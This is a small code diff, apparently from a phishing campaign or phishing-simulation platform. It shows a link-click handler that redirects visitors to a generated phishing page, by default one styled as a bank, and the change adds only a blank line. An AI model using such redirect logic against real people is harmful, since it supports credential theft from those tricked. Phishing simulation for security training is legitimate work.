@@ -42,6 +42,7 @@ export const handleLinkClick = async (
 
     // Redirect to the appropriate phishing page
     const phishingUrl = generatePhishingPageUrl(token, pageType || 'bank');
+  
     res.redirect(302, phishingUrl);
   } catch (error) {
     console.error('Link click tracking error:', error);
